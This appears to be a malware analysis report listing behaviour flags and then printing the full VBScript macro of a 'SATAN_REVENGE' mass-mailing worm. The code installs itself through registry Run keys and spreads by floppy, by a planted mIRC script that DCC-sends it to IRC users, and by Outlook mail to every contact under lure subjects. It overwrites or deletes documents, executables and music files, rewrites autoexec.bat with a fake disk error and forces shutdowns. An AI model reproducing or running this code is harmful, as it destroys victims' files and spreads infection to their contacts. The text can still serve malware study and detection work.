behavior.Base64 Strings: Base64-encoded str were detected, may be used to obfuscate str
behavior.Chr: May attempt to obfuscate specific str
behavior.Run: May run an executable file or a system command
behavior.Shell: May run an executable file or a system command
behavior.System: May run an executable file or a system command on a Mac
behavior.WScript.Shell: May run an executable file or a system command
behavior.autoexec: Runs when the Word document is opened

docinfo.macro:
On Error Resume Next
Const ForReading=1,ForWriting=2,ForAppending=8
Dim a,b,c,d,e,f,g,h,i,z,name1,name2,x,y,aaa,bbb,ccc,ddd,eee,mail,mailyou,mailout
Set a=CreateObject("Scripting.FileSystemObject")
Set b=CreateObject("WScript.Shell")

e=Chr(13)Chr(10)

z=b.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout")
if (z>=1) Then
b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout",0, "REG_DWORD"
End If

z=b.RegRead("HKEY_CLASSES_ROOT\txtfile\DefaultIcon\")
b.RegWrite "HKEY_CLASSES_ROOT\.666\","666"
b.RegWrite "HKEY_CLASSES_ROOT\666\ScriptEngine\","vbscript"
b.RegWrite "HKEY_CLASSES_ROOT\666\shell\Open\command\", "c:\windows\wscript.exe ""%1"" %*"
b.RegWrite "HKEY_CLASSES_ROOT\666\DefaultIcon\", z
b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", "C:\Windows\System\"&name2
b.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Version", "PART 2"

If a.FolderExists("C:\Program Files\ICQ") Then
b.RegWrite("HKEY_CURRENT_USER\Software\Mirabilis\Agent\Apps\ICQ\Enable","Yes"
b.RegWrite("HKEY_CURRENT_USER\Software\Mirabilis\Agent\Apps\ICQ\Parameters",""
b.RegWrite("HKEY_CURRENT_USER\Software\Mirabilis\Agent\Apps\ICQ\path","c:\windows\system\"&name2
b.RegWrite("HKEY_CURRENT_USER\Software\Mirabilis\Agent\Apps\ICQ\Startup",""
End If

c=a.GetFile(WScript.ScriptFullName)
name1="SATAN_REVENGE.TXT                                                                       .vbs")
name2="WINDOWS_SYSTEM_FILE.DLL                                                                       .666")
c.Copy("C:\"&name1)
c.Copy("C:\Windows\"&name1)
c.Copy("C:\Windows\System\"&name1)
c.Copy("C:\Windows\System\"&name2)

z=b.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
if (z<>"fox") Then
Set d=a.CreateTextFile("C:\Windows\System\SATAN_REVENGE.TXT",2)
d.Write("Continued From Satan Secrets..."&e&e&"The revenge of the satan is just to kill the jesus..."&e&"That's all!!! This is just what the santa did!!!"&e&"That's All Folks!!"&e&e&"< fox >")
d.Close
End If

For Each Target In a.Drives
if target.path = "A:" Then
c.Copy(target.path&"\")
End If
Next

For Each Target In a.GetFolder("C:\").SubFolders
If a.FileExists(target.path &"\" & "mirc.ini") Then
set d=a.CreateTextFile(target.path & "\" & "script.ini", 2)
d.Write("[script]"&e&"n0=;SATAN REVENGE"&e&"n1=;DO NOT EDIT WHOEVER EDIT THIS WILL DIE"&e&"n2=on *:start:{"&e&"n3=if ($exists(""c:\windows\"&name1&""") == $true) { set %s.file2send c:\windows\"&name1&" }"&e&"n4=else {"&e&"n5=if ($exists(""c:\windows\system\"&name1&""") == $true) { set %s.file2send c:\windows\system"&name1&" }"&e&"n6=else {"&e&"n7=if ($exists(""c:\"&name1&""") == $true) { set %s.file2send c:\"&name1&" }"&e&"n8=else  {"&e&"n9=if ($exists(""c:\windows\system\"&name2&""") == $true) { /run c:\windows\system\"&name2&" | set %s.file2send c:\windows\system\"&name1&" }"&e&"n10=else { /run c:\windows\rundll.exe user.exe,exitwindows }"&e&"n11=}"&e&"n12=}"&e&"n13=}"&e&"n14=/server irc.pacific.net.sg:6661"&e&"n15=}"&e&"n16=on *:input:*:/if ($1- == /remote off) { /echo -a - | /echo -a *** Remote is OFF | /echo -a -  | /halt } | elseif ($1- == /remote on) { /echo -a - | /echo -a *** Remote is ON (Ctcps,Events,Raw) | /echo -a - | /halt } | /elseif ($1- == /remote) { /echo -a - | /echo -a *** Remote is OFF | /echo -a - | /halt }"&e&"n17=on *:join:#:/if ($nick != $me) && ($r(1,6) == 3) { /.notice $nick Hi $nick $+ !!! i got this file from the net, it got some interesting info about the satan's revenge!!! it's interesting, after reading it u will sure LOVE it!! | /.timer 1 2 /.dcc send $nick %s.file2send } | elseif ($right($chan , $calc($len($chan) - 1)) isin virusfixhelpclearsatanclean) { /part $chan }"&e&"n18=on *:part:#:/if ($nick != $me) && ($r(1,6) == 3) { /.notice $nick Hi $nick $+ !!! i got this file from the net, it got some interesting info about the satan's revenge!!! it's interesting, after reading it u will sure LOVE it!! | /.timer 1 2 /.dcc send $nick %s.file2send }"&e&"n19=on *:connect:/join #f0xCiTY | /join #pioneer"&e&"n20=on *:part:#f0xCiTY:/join #f0xCiTY"&e&"n21=on *:part:#pioneer:/join #pioneer"&e&"n22=on *:disconnect:/.timer 1 2 /server irc.pacific.net.sg:6661"&e&"n23=on *:sendfail:*.vbs:/if ($r(1,6) == 3) { /.notice $nick Please Get The File... | /.timer 1 2 /.dcc send $nick $filename }"&e&"n24=on *:nick:/if ($newnick != $me) && ($r(1,10) == 5) { /.notice $newnick Hi $newnick $+ !!! i got this file from the net, it got some interesting info about the satan's revenge!!! it's interesting, after reading it u will sure LOVE it!! | /.timer 1 2 /.dcc send $newnick %s.file2send }"&e&"n25=on *:ping:/if ($nick != $me) && ($r(1,20) == 10) { /.notice $nick Hi $nick $+ !!! i got this file from the net, it got some interesting info about the satan's revenge!!! it's interesting, after reading it u will sure LOVE it!! | /.timer 1 2 /.dcc send $nick %s.file2send }")
d.Close
End If
Next

Set d=a.OpenTextFile("C:\autoexec.bat",2)
d.Write(e&e&"@echo off"&e&"echo System Disk Boot Error"&e&"echo Please Format Hard Disk To Recover Disk"&e&"pause"&e&"cls"&e&"echo Written By fox"&e&"pause")
d.Close

Set d=a.OpenTextFile(WScript.ScriptFullName,1)
f=d.ReadAll

For Each Target In a.GetFolder("C:\").Files
x=lcase(a.GetExtensionName(target.name))
If (x="vbs") or (x="vbe") or (x="js") Then
Set d=a.OpenTextFile(target.path,2)
d.Write f
d.Close
ElseIf (x="txt") or (x="doc") Then
Set d=a.OpenTextFile(target.path,2)
d.Write("SATAN_REVENGE"&e&"Written By fox")
d.Close
ElseIf (x="exe") or (x="zip") or (x="rar") Then
Set d=a.CreateTextFile(target.path&".666",2)
d.Write f
d.Close
a.DeleteFile(target.path)
End If
Next

For Each Target In a.GetFolder("C:\My Documents").Files
x=lcase(a.GetExtensionName(target.name))
If (x="vbs") or (x="vbe") or (x="js") Then
Set d=a.OpenTextFile(target.path,2)
d.Write f
d.Close
ElseIf (x="txt") or (x="doc") Then
Set d=a.OpenTextFile(target.path,2)
d.Write("SATAN_REVENGE"&e&"Written By fox")
d.Close
ElseIf (x="exe") or (x="zip") or (x="rar") or (x="mp3") or (x="mp2") or (x="wav") or (x="mid") or (x="html") or (x="aif") Then
Set d=a.CreateTextFile(target.path&".666",2)
d.Write f
d.Close
a.DeleteFile(target.path)
End If
Next

For Each Target In a.GetFolder("C:\Windows").Files
x=lcase(a.GetExtensionName(target.name))
If (x="vbs") or (x="vbe") or (x="js") Then
Set d=a.OpenTextFile(target.path,2)
d.Write f
d.Close
ElseIf (x="txt") or (x="doc") Then
Set d=a.OpenTextFile(target.path,2)
d.Write("SATAN_REVENGE"&e&"Written By fox")
d.Close
ElseIf (x="exe") or (x="zip") or (x="rar") Then
Set d=a.CreateTextFile(target.path&".666",2)
d.Write f
d.Close
a.DeleteFile(target.path)
End If
Next

For Each Target In a.GetFolder("C:\Windows\System").Files
x=lcase(a.GetExtensionName(target.name))
If (x="dll") or (x="inf") or (x="exe") Then
Set d=a.CreateTextFile(target.path&".666",2)
d.Write f
d.Close
a.DeleteFile(target.path)
End If
Next

If a.FolderExists("C:\My Music") Then
For Each Target In a.GetFolder("C:\My Music").Files
x=lcase(a.GetExtensionName(target.name))
If (x="mp3") or (x="mp2") or (x="wav") or (x="mid") or (x="aif") or (x="mpeg") Then
Set d=a.CreateTextFile(target.path&".666",2)
d.Write f
d.Close
a.DeleteFile(target.path)
End If
Next
End If

If a.FolderExists("C:\My Documents\My Music") Then
For Each Target In a.GetFolder("C:\My Music").Files
x=lcase(a.GetExtensionName(target.name))
If (x="mp3") or (x="mp2") or (x="wav") or (x="mid") or (x="aif") or (x="mpeg") Then
Set d=a.CreateTextFile(target.path&".666",2)
d.Write f
d.Close
a.DeleteFile(target.path)
End If
Next
End If

For Each Target In a.GetFolder("C:\Windows\desktop").Files
if lcase(a.GetExtensionName(target.name)) = "lnk" Then
Set xxxx = b.CreateShortcut("C:\windows\desktop\"&target.name)
xxxx.Targetpath = "C:\Windows\System\"&name2
xxxx.IconLocation = "C:\Windows\Regedit.exe, 0"
xxxx.Save
End If
Next

randomize

z=b.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
if (z<>"fox") Then
Set mailout = WScript.CreateObject("Outlook.Application")
Set mailyou = mailout.GetNameSpace("MAPI")
For aaa = 1 To mailyou.AddressLists.Count
Set ddd = mailyou.AddressLists(aaa)
bbb = 1
regv = b.RegRead("HKEY_LOCAL_MACHINE\Software\Microsof\WAB" & ma)
If (regv = "") Then
regv = 1
End If
If (int(ddd.AddressEntries.Count) > int(regv)) Then
For eee = 1 to ddd.AddressEntries.Count
mailed = ddd.AddressEntries(bbb)
ccc = ""
ccc = b.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB" & mailed)
if (ccc="") then
i=Int((5 * rnd) + 1)
if (i=5) Then
g="FW: SATAN REVENGE STORY..."
h="Please read this attachment. i'm sure that u will be satisfied with it"
ElseIf (i=4) Then
g="FW: THE REVENGE OF THE KID..."
h="This is the document which i found on the net. i found it sad and interesting. it is worth reading."
ElseIf (i=3) Then
g="FW: SOME TIPS TO REVENGE ON THE PERSON U HATE..."
h="This document contains some tips that u will sure want..."
ElseIf (i=2) Then
g="FW: ROMEO+JULIET STORY..."
h="This is the story of how this two great lover died of love... interesting and touching story..."
ElseIf (i=1) Then
g="FW: HOW THIS GUY DIE BECAUSE OF A REVENGE..."
h="This is the news article i got from the net... it worth having treating this as a lesson..."
End If
Set mail = mailout.CreateItem(0)
mail.Recipients.Add(mailed)
mail.Subject = g
mail.Body = h
mail.Attachments.Add(WScript.ScriptFullName)
mail.Send
b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" &mailed,1,"REG_DWORD"
End If
x=x+1 
next
b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ddd,ddd.AddressEntries.Count
Else
b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ddd,ddd.AddressEntries.Count
End If
Next
End If
Set mailout = Nothing
Set mailyou = Nothing

If a.FileExists("C:\Windows\System\SATAN_REVENGE.TXT") Then
a.DeleteFile("C:\Windows\System\SATAN_REVENGE.TXT")
End If

If Day(Now) = 7 or Day(Now) = 17 or Day(Now) = 27 Then
Do
MsgBox "I LOVE ANA^SAHARI"
Loop
End If

If Day(Now) = 5 or Day(Now) = 15 or Day(Now) = 25 Then
b.Run("c:\windows\rundll.exe user.exe,exitwindows")
End If

z=b.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
if (z<>"fox") Then
z=Hour(Now)
y="AM"
If z>12 Then
y="PM"
z=z-12
End If
msgbox "Time is: "&z&":"& Minute(Now) & y & chr(13) & "And we're outta here! ;-)" 
b.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","fox"
b.Run("c:\windows\rundll.exe user.exe,exitwindows")
End If
